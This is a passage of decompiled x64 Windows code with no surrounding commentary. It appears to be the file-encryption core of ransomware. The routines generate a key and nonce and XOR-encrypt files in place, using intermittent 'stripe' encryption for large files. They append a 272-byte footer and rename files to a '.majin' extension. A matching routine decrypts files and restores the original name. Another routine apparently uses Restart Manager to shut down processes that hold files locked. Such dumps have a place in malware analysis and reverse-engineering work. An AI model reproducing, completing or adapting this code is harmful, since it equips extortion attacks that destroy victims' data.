  int v23; // r13d
  __int64 v24; // r8
  int v25; // edi
  __int64 v26; // rcx
  __int64 v27; // rsi
  int v28; // eax
  int v29; // r15d
  __int64 (__fastcall *v30)(__int64, _QWORD, _QWORD); // rsi
  int v31; // r15d
  __int64 v32; // rax
  __int64 v33; // rax
  __int64 v34; // r14
  _WORD *v35; // r15
  _WORD *v36; // rax
  _WORD *v37; // rsi
  int v38; // eax
  int v39; // ecx
  void (__fastcall *v40)(__int64, _QWORD, _WORD *); // rdi
  __int64 v41; // rax
  void (__fastcall *v42)(__int64, _QWORD, _WORD *); // rdi
  __int64 v43; // rax
  void (__fastcall *v44)(__int64, _QWORD, __int64); // rdi
  __int64 v45; // rax
  int v46; // [rsp+30h] [rbp-D0h] BYREF
  _BYTE v47[8]; // [rsp+38h] [rbp-C8h] BYREF
  __int16 v48; // [rsp+40h] [rbp-C0h] BYREF
  char v49; // [rsp+42h] [rbp-BEh]
  __int64 v50; // [rsp+60h] [rbp-A0h] BYREF
  int v51; // [rsp+68h] [rbp-98h] BYREF
  _BYTE v52[32]; // [rsp+70h] [rbp-90h] BYREF
  _BYTE v53[272]; // [rsp+90h] [rbp-70h] BYREF
  _BYTE v54[272]; // [rsp+1A0h] [rbp+A0h] BYREF
  _BYTE v55[320]; // [rsp+2B0h] [rbp+1B0h] BYREF
  int v58; // [rsp+418h] [rbp+318h] BYREF
  char v59; // [rsp+41Fh] [rbp+31Fh]

  v5 = a2;
  v6 = 0;
  v7 = sub_140005F80(a2);
  if ( v7 == -1 )
  {
    v8 = qword_140018710();
    if ( (unsigned int)(v8 - 32) > 1 && v8 != 5 && v8 != 1224 )
      return 1;
    if ( (unsigned int)sub_1400065F0(v5) == 0 )
      return 1;
    v7 = sub_140005F80(v5);
    if ( v7 == -1 )
      return 1;
  }
  if ( a3 < 272 )
    goto LABEL_21;
  v10 = a3 - 272;
  qword_140018828(v7, -272, 0, 2);
  if ( (unsigned int)qword_1400187F8(v7, v54, 272, &v58, 0) == 0 || v58 != 272 )
    goto LABEL_21;
  v11 = sub_1400088F0(
          (unsigned int)v54,
          (unsigned int)v52,
          (unsigned int)v47,
          (unsigned int)&v46,
          (__int64)&v50,
          (__int64)&v51);
  if ( v11 == 0 )
  {
    if ( v46 == 2 )
    {
      v22 = v50;
      v23 = v51;
      if ( v50 <= 0 )
        v22 = 31457280;
      if ( v51 <= 0 )
        v23 = 3;
      qword_140018828(v7, 0, 0, 0);
      v24 = 0;
      v25 = 0;
      while ( 1 )
      {
        if ( v23 == 1 || v25 == 0 )
        {
          v26 = 0;
        }
        else if ( v25 == v23 - 1 )
        {
          v26 = v10 - v22;
        }
        else
        {
          v26 = v10 * v25 / ((unsigned int)v23 - 1LL);
        }
        if ( v26 + v22 > v10 )
          v26 = v10 - v22;
        v27 = 0;
        if ( v26 >= 0 )
          v27 = v26;
        if ( v25 != 0 && (unsigned int)qword_140018828(v7, v27 - v24, 0, 1) == 0 )
          goto LABEL_55;
        sub_14000A820(&v58, v47, 8);
        v59 ^= v25;
        sub_140007EA0(v55, v52, &v58);
        if ( (unsigned int)sub_140006010(
                             v7,
                             (unsigned int)v55,
                             v22,
                             *(_QWORD *)(a1 + 16),
                             *(_QWORD *)(a1 + 24),
                             *(_DWORD *)(a1 + 8)) != 0 )
          goto LABEL_55;
        v24 = v27 + v22;
        if ( v27 + v22 < v10 && ++v25 < v23 )
          continue;
        v5 = a2;
        goto LABEL_46;
      }
    }
    qword_140018828(v7, 0, 0, 0);
    sub_140007EA0(v53, v52, v47);
    if ( (unsigned int)sub_140006010(
                         v7,
                         (unsigned int)v53,
                         v10,
                         *(_QWORD *)(a1 + 16),
                         *(_QWORD *)(a1 + 24),
                         *(_DWORD *)(a1 + 8)) != 0 )
    {
LABEL_55:
      v6 = 5;
      goto LABEL_22;
    }
LABEL_46:
    qword_140018828(v7, v10, 0, 0);
    qword_140018810(v7);
    qword_140018640(v7);
    memset(v52, 0, sizeof(v52));
    memset(v47, 0, sizeof(v47));
    memset(v54, 0, 0x40u);
    memset(v53, 0, 0x108u);
    v28 = qword_1400187C8(v5);
    v29 = v28;
    if ( v28 <= 6 || (unsigned int)qword_1400187A8(v5 + v28 - 6LL, ".majin") != 0 )
      return v6;
    v30 = (__int64 (__fastcall *)(__int64, _QWORD, _QWORD))qword_140018768;
    v31 = v29 - 6;
    v32 = qword_140018740();
    v33 = v30(v32, 0, v31 + 1);
    v34 = v33;
    if ( v33 == 0 )
      return 6;
    sub_14000A820(v33, v5, v31);
    *(_BYTE *)(v31 + v34) = 0;
    v35 = sub_140003DE0(v5);
    v36 = sub_140003DE0(v34);
    v37 = v36;
    if ( v35 != nullptr && v36 != nullptr )
    {
      v38 = qword_1400187E0(v35, v36, 1);
      v39 = 6;
      if ( v38 != 0 )
        v39 = 0;
      v6 = v39;
    }
    else
    {
      v6 = 6;
      if ( v35 == nullptr )
      {
LABEL_58:
        if ( v37 != nullptr )
        {
          v42 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
          v43 = qword_140018740();
          v42(v43, 0, v37);
        }
        v44 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
        v45 = qword_140018740();
        v44(v45, 0, v34);
        return v6;
      }
    }
    v40 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
    v41 = qword_140018740();
    v40(v41, 0, v35);
    goto LABEL_58;
  }
  v12 = qword_140018750(4294967284LL);
  if ( v12 != 0 && v12 != -1 )
  {
    v48 = 15733;
    v13 = v11;
    if ( v11 < 0 )
    {
      v49 = 45;
      v13 = -v11;
    }
    v14 = (v11 >> 31) & 1;
    v15 = v14;
    v16 = v14 + 2;
    v17 = v15 + 2;
    v18 = (char *)&v48 + v16;
    do
    {
      v19 = (int)v17++;
      *v18++ = v13 % 10 + 48;
      v13 /= 10;
    }
    while ( v13 != 0 );
    for ( i = v19; v16 < i; --i )
    {
      v21 = *((_BYTE *)&v48 + v16);
      *((_BYTE *)&v48 + v16++) = *((_BYTE *)&v48 + i);
      *((_BYTE *)&v48 + i) = v21;
    }
    qword_140018880(v12, &v48, v17, &v58, 0);
  }
LABEL_21:
  v6 = 4;
LABEL_22:
  qword_140018640(v7);
  return v6;
}


// ----- sub_140005590 @ 0x140005590 -----
__int64 __fastcall sub_140005590(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // r12
  __int64 v5; // r15
  __int64 v6; // r13
  int v7; // edx
  __int64 v9; // rcx
  __int64 v10; // rcx
  __int64 v11; // rcx
  __int64 v12; // rcx
  __int64 v13; // rcx
  __int64 v14; // r9
  int v15; // r14d
  __int64 v16; // rcx
  unsigned int v17; // eax
  __int64 v18; // rcx
  unsigned int v19; // esi
  __int64 v20; // rcx
  int v21; // r14d
  __int64 v22; // rcx
  int v23; // edi
  __int64 v24; // r8
  __int64 v25; // r10
  __int64 v26; // rdx
  int v27; // r14d
  __int64 v28; // r15
  __int64 v29; // rax
  int v30; // ecx
  __int64 v31; // rdi
  __int64 v32; // rax
  __int64 v33; // rcx
  __int64 v34; // rax
  __int64 v35; // rax
  __int64 v36; // rax
  __int64 v37; // rax
  __int64 v38; // rax
  char v39; // al
  int v40; // r9d
  int v41; // eax
  __int64 (__fastcall *v42)(__int64, _QWORD, __int64); // rsi
  __int64 v43; // r14
  __int64 v44; // rdi
  __int64 v45; // rax
  __int64 v46; // rax
  __int64 v47; // r12
  _WORD *v48; // r15
  _WORD *v49; // rax
  _WORD *v50; // r14
  void (__fastcall *v51)(__int64, _QWORD, _WORD *); // rdi
  __int64 v52; // rax
  void (__fastcall *v53)(__int64, _QWORD, _WORD *); // rdi
  __int64 v54; // rax
  void (__fastcall *v55)(__int64, _QWORD, __int64); // rdi
  __int64 v56; // rax
  int v57; // [rsp+30h] [rbp-D0h]
  int v58; // [rsp+34h] [rbp-CCh]
  __int64 v59; // [rsp+38h] [rbp-C8h]
  __int64 v60; // [rsp+40h] [rbp-C0h] BYREF
  _BYTE v61[8]; // [rsp+48h] [rbp-B8h] BYREF
  char v62[4]; // [rsp+50h] [rbp-B0h] BYREF
  char v63[4]; // [rsp+54h] [rbp-ACh] BYREF
  char v64[4]; // [rsp+58h] [rbp-A8h] BYREF
  char v65[4]; // [rsp+5Ch] [rbp-A4h] BYREF
  char v66[8]; // [rsp+60h] [rbp-A0h] BYREF
  __int64 v67; // [rsp+68h] [rbp-98h]
  _BYTE v68[32]; // [rsp+70h] [rbp-90h] BYREF
  int v69[16]; // [rsp+90h] [rbp-70h] BYREF
  _BYTE v70[272]; // [rsp+D0h] [rbp-30h] BYREF
  _BYTE v71[280]; // [rsp+1E0h] [rbp+E0h] BYREF
  int v75; // [rsp+358h] [rbp+258h] BYREF

  LODWORD(v4) = 0;
  v5 = a2;
  v6 = sub_140005F80(a2);
  if ( v6 == -1 )
  {
    v7 = qword_140018710();
    if ( (unsigned int)(v7 - 32) > 1 && v7 != 5 && v7 != 1224 )
      return 1;
    if ( (unsigned int)sub_1400065F0(v5) == 0 )
      return 1;
    v6 = sub_140005F80(v5);
    if ( v6 == -1 )
      return 1;
  }
  if ( *(_DWORD *)(a1 + 8) != 0 )
  {
    if ( (unsigned int)qword_1400186F0(v6, &v60) != 0 )
    {
      v9 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v9 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v9, "  opened, size=", 13, &v75, 0);
      sub_140004F00(v60 / 0x100000);
      v10 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v10 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v10, "MB", 2, &v75, 0);
    }
    if ( (unsigned int)qword_1400186E8(v6, v69) != 0 )
    {
      if ( (v69[0] & 0x200) != 0 )
      {
        v11 = qword_140018750(4294967285LL);
        if ( (unsigned __int64)(v11 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
          qword_140018880(v11, " SPARSE", 7, &v75, 0);
      }
      if ( (v69[0] & 0x800) != 0 )
      {
        v12 = qword_140018750(4294967285LL);
        if ( (unsigned __int64)(v12 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
          qword_140018880(v12, " COMPRESSED", 11, &v75, 0);
      }
    }
    v13 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v13 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018880(v13, "\r\n", 2, &v75, 0);
  }
  if ( (unsigned int)sub_1400085E0(v68, 32) == 0 || (unsigned int)sub_1400085E0(v61, 8) == 0 )
  {
    v19 = 3;
LABEL_112:
    qword_140018640(v6);
    return v19;
  }
  v14 = a3;
  if ( a3 <= 314572800 || (v15 = 1, HIDWORD(xmmword_140017620) != 0) )
    v15 = 0;
  v58 = v15;
  if ( *(_DWORD *)(a1 + 8) != 0 )
  {
    v16 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v16 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018880(v16, "  file ", 7, &v75, 0);
    v17 = qword_1400187C8(v5);
    sub_140005000(v5, v17);
    v18 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v18 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018880(v18, "\r\n", 2, &v75, 0);
    v14 = a3;
  }
  v19 = 4;
  if ( v15 == 0 )
  {
    if ( *(_DWORD *)(a1 + 8) != 0 )
    {
      v20 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v20 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v20, "  [full] off=0 len=", 16, &v75, 0);
      v21 = a3;
      sub_140004F00(a3 / 0x100000);
      v22 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v22 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v22, "MB\r\n", 4, &v75, 0);
    }
    else
    {
      v21 = a3;
    }
    qword_140018828(v6, 0, 0, 0);
    sub_140007EA0(v70, v68, v61);
    if ( (unsigned int)sub_140006010(
                         v6,
                         (unsigned int)v70,
                         v21,
                         *(_QWORD *)(a1 + 16),
                         *(_QWORD *)(a1 + 24),
                         *(_DWORD *)(a1 + 8)) == 0 )
    {
      LOBYTE(v23) = 0;
      goto LABEL_92;
    }
LABEL_42:
    v19 = 5;
    goto LABEL_112;
  }
  v23 = xmmword_140017620;
  v24 = 0;
  v25 = (int)xmmword_140017620;
  v57 = xmmword_140017620;
  if ( SDWORD1(xmmword_140017620) <= 0 )
  {
    v4 = 31457280;
  }
  else
  {
    v4 = SDWORD1(xmmword_140017620) * (v14 / 1000);
    v26 = 2 * (v14 / 100);
    if ( (int)xmmword_140017620 * v4 < v26 )
      v4 = v26 / (int)xmmword_140017620;
    if ( v4 < 31457280 )
      v4 = 31457280;
    if ( SDWORD2(xmmword_140017620) > 0 && v4 > SDWORD2(xmmword_140017620) )
      v4 = SDWORD2(xmmword_140017620);
  }
  v27 = 0;
  if ( (int)xmmword_140017620 <= 0 )
    goto LABEL_92;
  v28 = v14 - v4;
  v29 = v14 - v4;
  v59 = v14 - v4;
  v67 = v14 - v4;
  while ( 1 )
  {
    if ( v25 == 1 || v27 == 0 )
    {
      v59 = v28;
      v32 = v28;
      v31 = 0;
      if ( v4 <= v14 )
        v32 = 0;
      if ( v32 >= 0 )
        v31 = v32;
      if ( v27 == 0 )
      {
        if ( (unsigned int)qword_140018828(v6, 0, 0, 0) == 0 )
          goto LABEL_42;
        v59 = v28;
        goto LABEL_73;
      }
    }
    else
    {
      v30 = v23 - 1;
      v31 = 0;
      if ( v27 == v30 )
      {
        v59 = v29;
        v28 = v29;
        if ( v29 >= 0 )
          v31 = v29;
      }
      else
      {
        if ( v14 * v27 / v30 + v4 <= v14 )
          v28 = v14 * v27 / v30;
        if ( v28 >= 0 )
          v31 = v28;
        v28 = v59;
      }
    }
    if ( (unsigned int)qword_140018828(v6, v31 - v24, 0, 1) == 0 )
      goto LABEL_42;
LABEL_73:
    sub_14000A820(&v60, v61, 8);
    HIBYTE(v60) ^= v27;
    sub_140007EA0(v70, v68, &v60);
    v33 = a1;
    if ( *(_DWORD *)(a1 + 8) != 0 )
    {
      v34 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v34 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v34, "  [stripe ", 9, v62, 0);
      LOBYTE(v75) = v27 + 48;
      v35 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v35 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v35, &v75, 1, v63, 0);
      v36 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v36 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v36, "] off=", 6, v64, 0);
      sub_140004F00(v31 / 0x100000);
      v37 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v37 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v37, "MB len=", 6, v65, 0);
      sub_140004F00(v4 / 0x100000);
      v38 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v38 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v38, "MB\r\n", 4, v66, 0);
      v33 = a1;
    }
    if ( (unsigned int)sub_140006010(
                         v6,
                         (unsigned int)v70,
                         v4,
                         *(_QWORD *)(v33 + 16),
                         *(_QWORD *)(v33 + 24),
                         *(_DWORD *)(v33 + 8)) != 0 )
      goto LABEL_42;
    v14 = a3;
    v24 = v4 + v31;
    if ( v4 + v31 >= a3 )
      break;
    v23 = v57;
    if ( ++v27 >= v57 )
      goto LABEL_91;
    v29 = v67;
    v25 = v57;
  }
  LOBYTE(v23) = v57;
LABEL_91:
  v5 = a2;
LABEL_92:
  v39 = 0;
  v40 = 0;
  if ( v58 != 0 )
  {
    v39 = v23;
    v40 = v4;
  }
  if ( (unsigned int)sub_140008450((unsigned int)v68, (unsigned int)v61, 2 * v58, v40, v39, (__int64)v71) != 0 )
    goto LABEL_112;
  if ( (unsigned int)qword_140018828(v6, 0, 0, 2) == 0 )
  {
    v19 = 5;
    goto LABEL_112;
  }
  if ( (unsigned int)qword_140018880(v6, v71, 272, &v75, 0) == 0 || v75 != 272 )
    goto LABEL_112;
  sub_14000A980(v6);
  memset(v68, 0, sizeof(v68));
  memset(v61, 0, sizeof(v61));
  memset(v70, 0, 0x108u);
  v41 = qword_1400187C8(v5);
  v42 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
  v43 = v41;
  v44 = v41 + 7;
  v45 = qword_140018740();
  v46 = v42(v45, 0, v44);
  v47 = v46;
  if ( v46 != 0 )
  {
    sub_14000A820(v46, v5, v43);
    sub_14000A820(v43 + v47, ".majin", 7);
    v48 = sub_140003DE0(v5);
    v49 = sub_140003DE0(v47);
    v50 = v49;
    if ( v48 != nullptr && v49 != nullptr )
    {
      v19 = 6;
      if ( (unsigned int)qword_1400187E0(v48, v49, 1) != 0 )
        v19 = 0;
LABEL_106:
      v51 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
      v52 = qword_140018740();
      v51(v52, 0, v48);
    }
    else
    {
      v19 = 6;
      if ( v48 != nullptr )
        goto LABEL_106;
    }
    if ( v50 != nullptr )
    {
      v53 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
      v54 = qword_140018740();
      v53(v54, 0, v50);
    }
    v55 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
    v56 = qword_140018740();
    v55(v56, 0, v47);
  }
  else
  {
    return 6;
  }
  return v19;
}


// ----- sub_140005F00 @ 0x140005f00 -----
_BOOL8 __fastcall sub_140005F00(__int64 a1, __int64 a2)
{
  __int64 v4; // rsi
  int v5; // eax

  v4 = (int)qword_1400187C8(a1);
  v5 = qword_1400187C8(a2);
  return v5 <= (int)v4 && (unsigned int)qword_1400187A8(a1 + v4 - v5, a2) == 0;
}


// ----- sub_140005F80 @ 0x140005f80 -----
__int64 __fastcall sub_140005F80(__int64 a1)
{
  _WORD *v1; // rsi
  __int64 v3; // rax
  void (__fastcall *v4)(__int64, _QWORD, _WORD *); // rbx
  __int64 v5; // rdi
  __int64 v6; // rax

  v1 = sub_140003DE0(a1);
  if ( v1 == nullptr )
    return -1;
  v3 = qword_140018650(v1, 3221225472LL, 0, 0, 3, 128, 0);
  v4 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
  v5 = v3;
  v6 = qword_140018740();
  v4(v6, 0, v1);
  return v5;
}


// ----- sub_140006010 @ 0x140006010 -----
__int64 __fastcall sub_140006010(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5, int a6)
{
  __int64 v8; // rsi
  int v9; // eax
  int v10; // r14d
  __int64 v11; // r15
  int v12; // ebx
  __int64 v13; // rcx
  unsigned int v14; // ebx
  __int64 v15; // rax
  __int64 v16; // rax
  int v17; // edi
  __int64 v18; // rax
  int v19; // eax
  __int64 v20; // rax
  int v21; // ebx
  __int64 v22; // rax
  int v23; // eax
  __int64 v24; // rax
  __int64 v25; // rax
  __int64 v26; // rax
  int v27; // esi
  int v28; // ebx
  int v29; // edi
  unsigned int v30; // edi
  __int64 v31; // rax
  unsigned __int64 v32; // rcx
  __int64 v33; // rax
  char *v34; // r9
  __int64 v35; // r8
  __int64 v36; // rax
  int v37; // eax
  __int64 v38; // rax
  __int64 v40; // rax
  unsigned int v41; // eax
  __int64 v42; // rax
  _BYTE v43[4]; // [rsp+30h] [rbp-40h] BYREF
  int v44; // [rsp+34h] [rbp-3Ch]
  int v45; // [rsp+38h] [rbp-38h] BYREF
  char v46[4]; // [rsp+3Ch] [rbp-34h] BYREF
  char v47[4]; // [rsp+40h] [rbp-30h] BYREF
  char v48[4]; // [rsp+44h] [rbp-2Ch] BYREF
  char v49[4]; // [rsp+48h] [rbp-28h] BYREF
  char v50[4]; // [rsp+4Ch] [rbp-24h] BYREF
  char v51[4]; // [rsp+50h] [rbp-20h] BYREF
  char v52[4]; // [rsp+54h] [rbp-1Ch] BYREF
  char v53[4]; // [rsp+58h] [rbp-18h] BYREF
  char v54[4]; // [rsp+5Ch] [rbp-14h] BYREF
  char v55; // [rsp+60h] [rbp-10h] BYREF
  char v56[12]; // [rsp+64h] [rbp-Ch] BYREF
  unsigned int v59; // [rsp+C0h] [rbp+50h] BYREF

  v8 = a1;
  v9 = qword_140018758();
  v10 = a6;
  v11 = 0;
  v44 = v9;
  v12 = v9;
  if ( a3 <= 0 )
  {
LABEL_43:
    if ( v10 != 0 )
    {
      v36 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v36 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v36, "    region total ", 16, v43, 0);
      v37 = qword_140018758();
      sub_140004F00((unsigned int)(v37 - v12));
      v38 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v38 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v38, "ms\r\n", 4, v43, 0);
    }
    return 0;
  }
  v13 = a5;
  while ( 1 )
  {
    v14 = v13;
    if ( v13 > a3 - v11 )
      v14 = a3 - v11;
    if ( v10 != 0 )
    {
      v15 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v15 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v15, "read(", 5, v46, 0);
      sub_140004F00((unsigned __int64)v14 >> 20);
      v16 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v16 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v16, "MB)...", 6, v47, 0);
    }
    v17 = qword_140018758();
    if ( (unsigned int)sub_14000A9A0(v8, a4, v14, &v59) == 0 || v59 == 0 )
    {
LABEL_42:
      v12 = v44;
      goto LABEL_43;
    }
    if ( v10 == 0 )
      goto LABEL_17;
    v18 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v18 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018880(v18, "ok(", 3, v48, 0);
    v19 = qword_140018758();
    sub_140004F00((unsigned int)(v19 - v17));
    v20 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v20 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      qword_140018880(v20, "ms) ", 4, v49, 0);
      v21 = qword_140018758();
      sub_140007F40(a2, a4, v59);
    }
    else
    {
LABEL_17:
      v21 = qword_140018758();
      sub_140007F40(a2, a4, v59);
      if ( v10 == 0 )
        goto LABEL_22;
    }
    v22 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v22 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018880(v22, "xor(", 4, v50, 0);
    v23 = qword_140018758();
    sub_140004F00((unsigned int)(v23 - v21));
    v24 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v24 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018880(v24, "ms) ", 4, v51, 0);
LABEL_22:
    if ( (unsigned int)qword_140018828(v8, -(__int64)v59, 0, 1) == 0 )
      return 0xFFFFFFFFLL;
    if ( v10 != 0 )
    {
      v25 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v25 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v25, "write(", 6, v52, 0);
      sub_140004F00((unsigned __int64)v59 >> 20);
      v26 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v26 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
        qword_140018880(v26, "MB)...", 6, v53, 0);
    }
    v27 = qword_140018758();
    v45 = 0;
    v28 = sub_14000AA00(a1, a4, v59, &v45);
    v29 = qword_140018758();
    if ( v28 == 0 || v45 != v59 )
      break;
    if ( v10 != 0 )
    {
      v30 = v29 - v27;
      v31 = qword_140018750(4294967285LL);
      v32 = v31 - 1;
      if ( v30 <= 0x1F4 )
      {
        if ( v32 <= 0xFFFFFFFFFFFFFFFDuLL )
          qword_140018880(v31, "ok(", 3, v56, 0);
        sub_140004F00(v30);
        v33 = qword_140018750(4294967285LL);
        if ( (unsigned __int64)(v33 - 1) > 0xFFFFFFFFFFFFFFFDuLL )
          goto LABEL_41;
        v34 = v43;
        v35 = 3;
      }
      else
      {
        if ( v32 <= 0xFFFFFFFFFFFFFFFDuLL )
          qword_140018880(v31, "SLOW(", 5, v54, 0);
        sub_140004F00(v30);
        v33 = qword_140018750(4294967285LL);
        if ( (unsigned __int64)(v33 - 1) > 0xFFFFFFFFFFFFFFFDuLL )
          goto LABEL_41;
        v34 = &v55;
        v35 = 4;
      }
      qword_140018880(v33, "ms)", v35, v34, 0);
    }
LABEL_41:
    v8 = a1;
    v11 += v59;
    v13 = a5;
    if ( v11 >= a3 )
      goto LABEL_42;
  }
  if ( v10 != 0 )
  {
    v40 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v40 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018880(v40, " FAIL(", 6, v43, 0);
    v41 = qword_140018710();
    sub_140004F00(v41);
    v42 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v42 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018880(v42, ")", 1, v43, 0);
  }
  return 0xFFFFFFFFLL;
}


// ----- sub_1400065A0 @ 0x1400065a0 -----
void __fastcall sub_1400065A0(__int64 a1)
{
  void (__fastcall *v2)(__int64, __int64, _QWORD, char *, _QWORD); // rbx
  unsigned int v3; // eax
  char v4; // [rsp+48h] [rbp+10h] BYREF

  if ( qword_140017000 != -1 )
  {
    v2 = (void (__fastcall *)(__int64, __int64, _QWORD, char *, _QWORD))qword_140018880;
    v3 = qword_1400187C8(a1);
    v2(qword_140017000, a1, v3, &v4, 0);
  }
}


// ----- sub_1400065F0 @ 0x1400065f0 -----
__int64 __fastcall sub_1400065F0(__int64 a1)
{
  unsigned int v1; // esi
  _WORD *v2; // r14
  __int64 v3; // rdx
  __int64 v4; // rcx
  void (__fastcall *v5)(__int64, _QWORD, _WORD *); // rbx
  __int64 v6; // rax
  int v8; // r15d
  __int64 v9; // rbx
  __int64 (__fastcall *v10)(__int64, _QWORD, __int64); // rdi
  __int64 v11; // rax
  __int64 v12; // rdi
  __int64 v13; // rdx
  __int64 v14; // rcx
  int v15; // eax
  void (__fastcall *v16)(__int64, _QWORD, __int64); // rbx
  __int64 v17; // rax
  void (__fastcall *v18)(__int64, _QWORD, _WORD *); // rbx
  __int64 v19; // rdx
  __int64 v20; // rcx
  __int64 v21; // rax
  int v22; // [rsp+40h] [rbp-29h] BYREF
  _WORD *v23; // [rsp+48h] [rbp-21h] BYREF
  _BYTE v24[80]; // [rsp+50h] [rbp-19h] BYREF
  unsigned int v25; // [rsp+D8h] [rbp+6Fh] BYREF
  unsigned int v26; // [rsp+E0h] [rbp+77h] BYREF
  unsigned int v27; // [rsp+E8h] [rbp+7Fh] BYREF

  v1 = 0;
  v25 = 0;
  v26 = 0;
  v27 = 0;
  v22 = 0;
  if ( dword_140017668 != 0 )
    return 0;
  v2 = sub_140003DE0(a1);
  if ( v2 == nullptr )
    return 0;
  sub_14000A850(v24, 0, 66);
  if ( (unsigned int)qword_140018A68(&v25, 0, v24) != 0 )
    goto LABEL_6;
  v23 = v2;
  if ( (unsigned int)qword_140018A70(v25, 1, &v23, 0, 0, 0, 0) != 0 )
  {
    qword_140018A88(v25);
LABEL_6:
    v5 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
    v6 = qword_140018740(v4, v3);
    v5(v6, 0, v2);
    return 0;
  }
  v8 = qword_1400186C8();
  if ( (unsigned int)qword_140018A78(v25, &v27, &v26, 0, &v22) == 234 && v27 - 1 <= 0xFF )
  {
    v9 = v27;
    v10 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
    v26 = v27;
    v11 = ((__int64 (*)(void))qword_140018740)();
    v12 = v10(v11, 0, 668 * v9);
    if ( v12 != 0 )
    {
      if ( (unsigned int)qword_140018A78(v25, &v27, &v26, v12, &v22) == 0 )
      {
        v13 = 0;
        if ( v26 != 0 )
        {
          while ( 1 )
          {
            v14 = 668LL * (unsigned int)v13;
            v15 = *(_DWORD *)(v14 + v12);
            if ( v15 == v8 || (v15 & 0xFFFFFFFB) == 0 )
              break;
            v13 = (unsigned int)(v13 + 1);
            if ( (unsigned int)v13 >= v26 )
            {
              if ( v26 != 0 )
              {
                qword_140018A80(v25, 0, 0);
                v1 = 1;
              }
              break;
            }
          }
        }
      }
      v16 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
      v17 = qword_140018740(v14, v13);
      v16(v17, 0, v12);
    }
  }
  qword_140018A88(v25);
  v18 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
  v21 = qword_140018740(v20, v19);
  v18(v21, 0, v2);
  return v1;
}


// ----- sub_140006810 @ 0x140006810 -----
__int64 __fastcall sub_140006810(_DWORD *a1, __int64 a2, int a3)
{
  __int64 result; // rax
  __int64 v7; // rdi
  _WORD *v8; // rax
  __int64 (__fastcall *v9)(__int64, _QWORD, __int64); // rbx
  _WORD *v10; // rsi
  __int64 v11; // rdx
  __int64 v12; // rcx
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 (__fastcall *v15)(__int64, _QWORD, _WORD *); // rbx
  __int64 v16; // r15
  __int64 v17; // rdx
  __int64 v18; // rcx
  __int64 v19; // rax
  int v20; // eax
  __int64 v21; // rdi
  __int64 v22; // rbx
  __int64 v23; // rdx
  __int64 v24; // rcx
  __int64 v25; // rax
  unsigned int v26; // ebx
  __int64 v27; // rax
  __int64 v28; // rax
  void (__fastcall *v29)(__int64, _QWORD, __int64); // rbx
  __int64 v30; // rax
  __int64 v31; // rdi
